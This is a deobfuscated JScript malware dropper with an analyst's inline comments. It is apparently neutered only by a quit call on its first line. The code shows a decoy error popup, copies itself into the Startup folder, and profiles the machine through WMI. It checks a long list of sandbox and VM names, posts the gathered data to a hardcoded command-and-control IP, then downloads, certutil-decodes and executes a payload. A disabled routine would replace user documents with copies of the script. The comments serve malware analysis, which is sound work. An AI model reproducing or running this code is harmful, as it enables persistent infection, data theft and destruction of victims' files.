WScript.Quit(0);

var checksum = 0;
var encodingCounter = 0;

// Decoded variables below
var count = 0;

var errorTitle = "Message:";
var errorText = "Uncaught ReferenceError component is not defined #14247";
var newLine = String['fromCharCode'](13) + String['fromCharCode'](10);

var receivedCorrectFile = -1;
var notInStartupYet = false;
var sandboxDetected = false;
var c2response = null;

var exeFileObject = null;
var dataFile = null;
var autostartFileObject = null;
var thisJseFile = null;
var thisJseFileContent = null;

var wscript = this['WScript'];
var activeXObject = this['ActiveXObject'];
var scriptName = wscript['ScriptFullName'];
var fileSystemObject = new activeXObject('Scripting.FileSystemObject');
var shell = wscript['CreateObject']('WScript.Shell');

// Code for persistence. Write the script itself into the autostart.
try {
    if (scriptName['indexOf']('\\Startup\\') == -1) {
		// If the script's own name/path doesn't contain the path "Startup", ...
		// Which means that it checks if the script is already copied to the autostart
        thisJseFile = fileSystemObject['OpenTextFile'](scriptName, true, false, 0);
        thisJseFileContent = thisJseFile['ReadLine']();
        thisJseFile['Close']();
		// Copy the whole content into the variable thisJseFile
        notInStartupYet = true;
        shell['Popup'](unescape(errorText), 30, unescape(errorTitle), 1);
		// Print a popup with an error message - this is only decoy!
    }
} catch (e) {
    shell['Popup'](errorText, 6, errorTitle, 1);
	// Print a popup with an error message - this is only decoy!
}

var counter = 1;
while (1) {
    counter = counter + 1;
    if (counter == 2070000) {
		// Wait some time until the malware gets executed
		// Probably some sandbox evasion technique
        var enumerator = this['Enumerator'];
        var getObject = this['GetObject'];
        var application = new activeXObject('Shell.Application');
        var adodbStream = new activeXObject('ADODB.Stream');
        var ServerXMLHTTP = new activeXObject('Msxml2.ServerXMLHTTP');
        var userprofile = shell['ExpandEnvironmentStrings']('%USERPROFILE%');
		
        var tempDir = shell['ExpandEnvironmentStrings']('%TEMP%');
        var autostartDir = application['NameSpace'](7);
        var autostartDirJseFile = autostartDir['Self']['Path'] + '\\ons.jse';

        var C2Url = 'https://185.180.199.102/angola/mabutu.php';
        var newC2Url = C2Url + '?min=14b';
        var fullC2Url = null;
        var drives = fileSystemObject['Drives'];
        var fileEndings = '*.doc *.xls *.pdf *.rtf *.txt *.pub *.odt *.ods *.odp *.odm *.odc *.odb';
        var wmmiObject = null;
        var processList = checksum;
		var process = null;
		var drivesList = null;
        var drive = null;
		
		var osList = null;
		var pcList = null;
		var exepath = '';
        var cropath = '';
        var pcInfo = '';
        var line = '';
        var pList = '';
		var magicBytes = '';
        var documentPath = '';
        var variousDeviceInfo = '';
        var httpMethod = 'POST';        
		var c2ErrorIndicator = 0;
        
        var combinedPaths = autostartDirJseFile + tempDir;
		
		// Get various information about the running processes and the computer running onLine
		// The C2 server will probably return another binary/malware depending on the infected machine
        try {
            wmmiObject = getObject('winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2');
            processList = new enumerator(wmmiObject['ExecQuery']('Select * from Win32_Process'));
            osList = new enumerator(wmmiObject['ExecQuery']('Select * from Win32_OperatingSystem'));
            pcList = new enumerator(wmmiObject['ExecQuery']('Select * from Win32_ComputerSystem')); // Returns information about the device, memory, domain, name, manufacturer, *Owner*, etc.
            while (!osList['atEnd']()) {
                if (count == 5) break;
                variousDeviceInfo = variousDeviceInfo + osList['item']()['Caption'] + osList['item']()['Version'] + '*Locale:' + osList['item']()['Locale'];
                count++;
                osList['moveNext']();
            }
            variousDeviceInfo = variousDeviceInfo + newLine + autostartDirJseFile + newLine;
            count = 0;
			
            while (!pcList['atEnd']()) {
                if (count == 5) break;
                pcInfo = pcList['item']()['Name'] + '*' + pcList['item']()['Manufacturer'] + '*' + pcList['item']()['Model'] + '*' + pcList['item']()['CurrentTimeZone'];
                variousDeviceInfo = variousDeviceInfo + pcInfo;
                count++;
                pcList['moveNext']();
            }
            variousDeviceInfo = variousDeviceInfo + newLine;
            count = 0;
			
            while (!processList['atEnd']()) {
                if (count == 200) break;
                process = processList['item']();
                pList = pList + process['Name'] + '*' + process['ExecutablePath'] + newLine;
                count++;
                processList['moveNext']();
            }
        } catch (e) {}
		
		// This looks like an implementation to calculate a checksum
        try {
            combinedPaths = combinedPaths + pcInfo; // This is all the information we want to send to the C2
			// Iterate over the given string
            for (encodingCounter = 0; encodingCounter < combinedPaths['length']; encodingCounter++) {
				// Add each character to 
                checksum = (((checksum << (5)) - checksum) + combinedPaths['charCodeAt'](encodingCounter)) & 4294967295; // logical AND with 4294967295 = limit the output to 0xFFFFFFFF = 32 Bit length
            }
            if (autostartDirJseFile['indexOf']('\\AppData\\') == -1) {
                encodingCounter = 10;
            } else {
                encodingCounter = 20;
            }
        } catch (e) {
            checksum = 55555;
        }
		
		// VM evasion techniques. The malware tries to identify if it's running in a sandbox/vm
        pList = variousDeviceInfo + newLine + pList;
        if (pList['indexOf']('VMware') != -1 || pList['length'] < 1600 || pList['indexOf']('2B.exe') != -1 || pList['indexOf']('MUELLER-PC') != -1 || pList['indexOf']('Wireshark') != -1 || pList['indexOf']('Temp\\iexplore.exe') != -1 || pList['indexOf']('ProcessHacker') != -1 || pList['indexOf']('vmtoolsd') != -1 || pList['indexOf']('VBoxService') != -1 || pList['indexOf']('python') != -1 || pList['indexOf']('Proxifier.exe') != -1 || pList['indexOf']('Johnson') != -1 || pList['indexOf']('ImmunityDebugger.exe') != -1 || pList['indexOf']('HANSPETER-PC') != -1 || pList['indexOf']('ctfmon.exe*JOHN-PC') != -1 || pList['indexOf']('BehaviorDumper') != -1 || pList['indexOf']('anti-virus.EXE') != -1 || pList['indexOf']('AgentSimulator.exe') != -1 || pList['indexOf']('VzService.exe') != -1 || pList['indexOf']('VBoxTray.exe') != -1 || pList['indexOf']('VmRemoteGuest') != -1 || pList['indexOf']('SystemIT|admin') != -1 || pList['indexOf']('WIN7-TRAPS') != -1 || pList['indexOf']('Emily\\AppData') != -1 || pList['indexOf']('fakepos_bin') != -1 || pList['indexOf']('procexp') != -1 || pList['indexOf']('tcpdump') != -1 || pList['indexOf']('FrzState2k') != -1 || pList['indexOf']('C:\\DOCUME' + (('6' * 88) + 'qikfeatu4').split('')[0] + '1\\Miller') != -1 || pList['indexOf']('vmware') != -1 || pList['indexOf']('LOGSystem.Agent.Service.exe') != -1 || pList['indexOf']('C:\\Users\\user\\') != -1 || pList['indexOf']('C:\\Users\\milozs\\') != -1 || pList['indexOf']('IT-ADMIN') != -1 || pList['indexOf']('gemu-ga.exe') != -1 || pList['indexOf']('HAPUBWS') != -1 || pList['indexOf']('BennyDB.exe') != -1 || pList['indexOf']('Peter Wilson') != -1 || pList['indexOf']('Hong Lee') != -1 || pList['indexOf']('C:\\Users\\timmy\\') != -1 || pList['indexOf']('JOHN-PC*Dell') != -1 || pList['indexOf']('winace.') != -1 || pList['indexOf']('KMS Server Service.exe*') != -1) {
            sandboxDetected = true; //set this to false to circumvent vm detection
        }
		
        try {
            if (notInStartupYet && !sandboxDetected) {
				// Create a copy of this jse file in the autostart directory
                autostartFileObject = fileSystemObject['CreateTextFile'](autostartDirJseFile, true, false);
                autostartFileObject['WriteLine'](thisJseFileContent);
                autostartFileObject['Close']();
            }
        } catch (e) {}
        while (true) {
            try {
                exepath = tempDir + '\\' + Math['floor']((Math['random']() * (999)) + 1) + Math['floor']((Math['random']() * (999)) + 1) + '.exe';
                cropath = tempDir + '\\' + Math['floor']((Math['random']() * (999)) + 1) + Math['floor']((Math['random']() * (999)) + 1) + '.cro';
				ServerXMLHTTP['setOption'](3, 'MSXML');
                fullC2Url = newC2Url + '&sin=tamud' + '&p=' + Math['abs'](checksum) + '&i=' + c2ErrorIndicator + '&k=' + encodingCounter + '&r=' + Math['floor']((Math['random']() * (999)) + 1) + Math['floor']((Math['random']() * (999)) + 1) + Math['floor']((Math['random']() * (999)) + 1);
                ServerXMLHTTP['open'](httpMethod, fullC2Url, false);
                ServerXMLHTTP['send'](pList);
                if (ServerXMLHTTP['status'] == 200) {
                    if (c2ErrorIndicator == 0) {
                        c2response = ServerXMLHTTP['responseText'];
                        try {
                            if (ServerXMLHTTP['getResponseHeader']('RedSparrow') == '0') {
								// Checks for a specific header which is set when the response was the .exe malware
                                exepath = autostartDirJseFile;
                                receivedCorrectFile = 0;
                            }
                        } catch (e) {}
                        try {
                            if (ServerXMLHTTP['getResponseHeader']('Content-Transfer-Encoding') == 'binary') {
                                adodbStream['Open']();
                                adodbStream['Type'] = 1;
                                adodbStream['Write'](ServerXMLHTTP['responseBody']);
                                adodbStream['Position'] = 0;
                                adodbStream['SaveToFile'](exepath, 2);
                                adodbStream['Close']();
                            } else {
                                if (c2response.length > 10) {
                                    thisJseFile = fileSystemObject['CreateTextFile'](cropath, true, false);
                                    thisJseFile['WriteLine'](c2response);
                                    thisJseFile['Close']();
                                    wscript['Sleep'](5000);
									// Decode the received file, which is base64 encoded
                                    application['ShellExecute']('certutil', '-f -decode ' + cropath + ' "' + exepath + '"', '', 'open', 0);
                                }
                            }
                        } catch (e) {}
                    } else {
                        c2ErrorIndicator = 0;
                        continue;
                    }
					
                    if (receivedCorrectFile == 0) {
                        wscript['Sleep'](50000);
						// Sleep some more after not receiving the malware as exe
                        receivedCorrectFile = -1; // Reset the value and try again
                        c2ErrorIndicator = 9; // Used to tell the C2 Server that something went wrong
                        continue;
                    }
					
					
                    wscript['Sleep'](33000);
					
					// The code block below searches for all kinds of word/pdf/txt/rtf... files and replaces them with a copy of this script
                    if (!fileSystemObject['FileExists'](exepath) && false) { // It seems that this feature was disabled for some reason... bug? too high AV detection rate?
                        try {
							// Iterate over all available harddrives
                            drivesList = new enumerator(drives);
                            for (; !drivesList['atEnd'](); drivesList['moveNext']()) {
                                drive = drivesList['item']();
                                if ((drive['IsReady'] && (drive['DriveType'] == 3 || drive['DriveType'] == 1)) && userprofile['substring'](0, 1) != drive['DriveLetter']) {
                                    application['ShellExecute']('cmd', '/U /Q /C cd /D ' + drive['DriveLetter'] + ': && dir /b/s/x ' + fileEndings + '>>%TEMP%' + '\\data.txt', '', 'open', 0); // Find all documents with file endings listed in the fileEndings variable. Store it in the data.txt file
                                    // Another sleep - Sandbox evasion?
									wscript['Sleep'](1000 * 60);
                                }
                            }
							// Another sleep - Sandbox evasion?
                            wscript['Sleep'](1000 * 50);
							
							// Iterate over the found files
                            dataFile = fileSystemObject['GetFile'](tempDir + '\\data.txt')['OpenAsTextStream'](1, -1);
                            while (!dataFile['AtEndOfStream']) {
                                line = dataFile['ReadLine']();
                                documentPath = line['substring'](0, line['indexOf']('.'));
								// Replace all files with the script itself
                                application['ShellExecute']('cmd', '/U /Q /C copy /Y "' + autostartDirJseFile + '" "' + documentPath + '.jse" && del /Q/F "' + line + '"', '', 'open', 0);
                            }
                            dataFile['Close']();
                            fileSystemObject['DeleteFile'](tempDir + '\\data.txt'); // Delete the data file
                        } catch (e) {}
                        c2ErrorIndicator = 0;
                        continue;
                    }
					
					// Read first two bytes of received exe file and check if they are ASCII "MZ" -> exe
                    exeFileObject = fileSystemObject['GetFile'](exepath)['OpenAsTextStream'](1);
                    magicBytes = exeFileObject['ReadLine']()['substring'](0, 2);
                    exeFileObject['Close']();
					
                    if (magicBytes == "MZ" && c2ErrorIndicator == 0) {
                        try {
                            switch (receivedCorrectFile) {
                                case -1:
                                    try {
										// Everything worked as expected
                                        application['ShellExecute'](exepath, '', '', 'open', 1); //Execute received file
                                        c2ErrorIndicator = 59;
                                    } catch (e) {
                                        c2ErrorIndicator = 'Err:' + e;
                                    }
                                    break;
                                case 0:
                                    c2ErrorIndicator = 60;
                                    break;
                                case 1:
                                    c2ErrorIndicator = 61;
                                    break;
                                case 2:
                                    c2ErrorIndicator = 62;
                                    break;
                            }
                        } catch (e) {
                            c2ErrorIndicator = 9888;
                        }
                        wscript['Sleep'](9000);
                    }
                }
            } catch (e) {}
            wscript['Sleep'](50000);
        };
    };
};
